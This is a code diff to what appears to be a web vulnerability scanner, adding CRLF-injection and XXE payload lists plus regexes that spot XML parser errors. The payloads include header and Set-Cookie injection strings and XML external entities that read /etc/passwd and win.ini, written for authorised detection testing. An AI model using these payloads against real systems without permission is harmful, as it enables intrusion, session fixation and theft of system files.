@@ -333,3 +333,54 @@ def arith_payloads(marker: str, a: int, b: int) -> tuple[tuple[str, str], ...]:
         ("Smarty", f"{marker}{{{a}*{b}}}"),  # {marker}{a*b}
         ("Slim/Pug", f"{marker}#{{{a}*{b}}}"),  # {marker}#{a*b}
     )
+
+
+# --- CRLF injection / HTTP response splitting (spec 012, RF-01) ----------------------
+#
+# The payload is appended to the point's value. A hit needs the injected *header* parsed
+# back by ``httpx`` (or the whole response body replaced by the marker) — never a mere
+# body-text reflection (ADR-5). ``{header}`` / ``{token}`` are substituted by the detector.
+
+CRLF_TOKEN_BYTES = 6
+CRLF_HEADER = "X-WvInjected"
+
+CRLF_PAYLOADS: tuple[str, ...] = (
+    "\r\n{header}: {token}",  # raw CR LF — httpx percent-encodes it on the wire
+    "%0d%0a{header}: {token}",  # pre-encoded
+    "%0D%0A{header}:%20{token}",  # pre-encoded, upper, encoded space
+    "\u560a\u560d{header}: {token}",  # unicode-newline trick (some Java stacks)
+    "\r\n\r\n{body}",  # double CRLF -> full response body split
+    "\r\nSet-Cookie: wv{token}=1",  # response-header (session-fixation) split
+)
+CRLF_BODY_MARKER = "<html>wv{token}</html>"
+
+# --- XXE / XML external entity (spec 012, RF-04, opt-in) ---------------------------
+#
+# ``injection.xxe`` re-sends a POST point's body as XML. ``{file}`` is a ``file://`` URL,
+# ``{dtd}`` an in-scope URL for the parameter-entity probe (so the scope guard permits the
+# fetch attempt; the *error* is the signal, not a successful fetch), ``{token}`` a marker.
+# File content is matched by ``TRAVERSAL_SIGNATURES``; a parser error by the regexes below.
+
+XXE_CONTENT_TYPES: tuple[str, ...] = ("application/xml", "text/xml")
+XXE_FILES: tuple[str, ...] = ("file:///etc/passwd", "file:///c:/windows/win.ini")
+XXE_PAYLOADS: tuple[str, ...] = (
+    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{file}">]><r>wv{token}&xxe;</r>',
+    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "{dtd}"> %p;]><r>wv{token}</r>',
+    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "A"><!ENTITY b "&a;&a;&a;">]><r>&b;wv{token}</r>',
+)
+
+XXE_ERROR_SIGNATURES: tuple[re.Pattern[str], ...] = (
+    re.compile(
+        r"DOCTYPE is not allowed|DOCTYPE.{0,20}forbidden|DTDs? (?:are|is) not permitted", re.I
+    ),
+    re.compile(
+        r"external (?:entity|DTD|general)|EntityRef|undefined entity|entity .{0,20}not defined",
+        re.I,
+    ),
+    re.compile(
+        r"lxml\.etree\.XMLSyntaxError|xmlParseEntity|SAXParseException|ExpatError|"
+        r"XMLStreamException|DocumentBuilder",
+        re.I,
+    ),
+    re.compile(r"entit(?:y|ies) expansion|maximum entity|entity expansion limit", re.I),
+)
